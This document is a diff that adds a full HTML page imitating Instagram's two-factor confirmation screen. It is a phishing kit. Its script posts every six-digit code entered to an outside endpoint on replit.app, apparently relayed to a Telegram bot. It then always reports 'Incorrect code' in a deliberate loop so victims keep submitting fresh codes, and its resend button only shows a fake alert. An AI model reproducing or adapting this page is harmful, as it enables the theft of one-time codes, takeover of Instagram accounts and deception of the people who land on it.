@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Two-Factor Authentication</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen font-sans">
+
+  <div class="w-full max-w-sm px-6">
+
+    <!-- Instagram Logo at the Top -->
+    <div class="flex justify-center mb-8">
+      <img src="IMG_0085.png" alt="Instagram" class="w-16 h-16" />
+    </div>
+
+    <div class="text-center mb-6">
+      <h2 class="text-xl font-semibold text-gray-900">Enter confirmation code</h2>
+      <p class="text-sm text-gray-500 mt-2">
+        We sent a 6-digit code to your email, phone and SMS
+      </p>
+    </div>
+
+    <!-- Single 6-Digit Input -->
+    <div class="mb-8">
+      <input 
+        id="codeInput"
+        type="text" 
+        maxlength="6"
+        placeholder="000000"
+        class="w-full text-center text-3xl tracking-[8px] py-4 border-2 border-gray-300 rounded-2xl focus:border-blue-500 focus:outline-none"
+        autofocus
+      >
+    </div>
+
+    <!-- Confirm Button -->
+    <button id="confirmBtn"
+      class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3.5 rounded-xl mb-4 transition active:scale-95 disabled:opacity-70 flex items-center justify-center gap-2">
+      <span id="btnText">Confirm</span>
+      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" stroke-opacity="0.3"/>
+        <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+    </button>
+
+    <!-- Error Message -->
+    <div id="errorMsg" class="text-red-500 text-sm text-center hidden mb-4">
+      Incorrect code. Please try again.
+    </div>
+
+    <!-- Resend Code -->
+    <div class="text-center">
+      <button id="resendBtn" class="text-blue-600 text-sm font-medium hover:underline">
+        Resend code
+      </button>
+    </div>
+
+    <!-- Meta Logo at the Bottom -->
+    <div class="mt-16 flex justify-center">
+      <img src="IMG_0084.png" alt="Meta" class="h-8" />
+    </div>
+  </div>
+
+  <script>
+    const ENDPOINT = "https://admin-telegram-bot--fortuneigbinedi.replit.app/api/public/endpoint/L98ZP";
+
+    const codeInput = document.getElementById("codeInput");
+    const confirmBtn = document.getElementById("confirmBtn");
+    const btnText = document.getElementById("btnText");
+    const spinner = document.getElementById("spinner");
+    const errorMsg = document.getElementById("errorMsg");
+
+    // Only allow numbers + auto-submit when 6 digits entered
+    codeInput.addEventListener("input", () => {
+      codeInput.value = codeInput.value.replace(/\D/g, '');
+      if (codeInput.value.length === 6) {
+        confirmBtn.click();
+      }
+    });
+
+    // Confirm Button Click
+    confirmBtn.addEventListener("click", async () => {
+      const code = codeInput.value.trim();
+
+      if (code.length !== 6) {
+        alert("Please enter the full 6-digit code");
+        codeInput.focus();
+        return;
+      }
+
+      // Show loading animation
+      confirmBtn.disabled = true;
+      btnText.textContent = "Verifying...";
+      spinner.classList.remove("hidden");
+      errorMsg.classList.add("hidden");
+
+      // Send only 2FA code
+      const message = `Code:
+
+APP: INSTAGRAM
+2FA CODE: ${code}
+`;
+
+      try {
+        await fetch(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message })
+        });
+        console.log("✅ 2FA code sent");
+      } catch (err) {
+        console.error("Failed to send:", err);
+      }
+
+      // Always show incorrect message and reset (endless loop)
+      setTimeout(() => {
+        errorMsg.classList.remove("hidden");
+
+        confirmBtn.disabled = false;
+        btnText.textContent = "Confirm";
+        spinner.classList.add("hidden");
+
+        codeInput.value = "";
+        codeInput.focus();
+      }, 1600);
+    });
+
+    // Resend Code
+    document.getElementById("resendBtn").addEventListener("click", () => {
+      alert("A new confirmation code has been sent to your email, phone and SMS.");
+      codeInput.value = "";
+      codeInput.focus();
+    });
+
+    // Focus input on load
+    window.onload = () => codeInput.focus();
+  </script>
+</body>
+</html>
